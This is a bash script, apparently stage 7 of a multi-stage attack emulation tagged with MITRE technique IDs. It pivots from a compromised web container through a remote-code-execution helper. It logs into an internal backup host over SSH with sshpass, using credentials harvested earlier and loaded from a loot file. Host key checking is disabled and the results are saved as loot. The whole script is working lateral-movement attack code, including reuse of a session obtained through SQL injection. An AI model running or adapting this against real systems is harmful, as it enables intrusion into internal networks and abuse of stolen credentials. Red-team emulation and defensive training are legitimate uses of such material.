#!/bin/bash
# Stage 7 — Lateral Movement  (MITRE T1021.004 SSH / T1078 Valid Accounts)
# The attacker cannot reach internal-svc directly (segmentation). The SSH pivot
# therefore originates *inside* the compromised web container, via the RCE,
# using the credential harvested in stage 6.
source "$(dirname "$0")/lib.sh"
banner "STAGE 7 — LATERAL MOVEMENT (T1021 / T1078)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }
[ -f "$LOOT/creds.env" ] && source "$LOOT/creds.env"

log "Pivoting: web-container --SSH--> ${INTERNAL_HOST} as ${SSH_USER} ..."
OUT=$(rce "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 ${SSH_USER}@${INTERNAL_HOST} 'echo PIVOT_OK; whoami; hostname; ls -la backups'")
echo "$OUT" | tee "$LOOT/07-lateral.txt"

if echo "$OUT" | grep -q "PIVOT_OK"; then
  ok "Lateral movement successful — landed on the internal backup host."
else
  err "Pivot failed (is the credential correct / sshd up?)."
fi
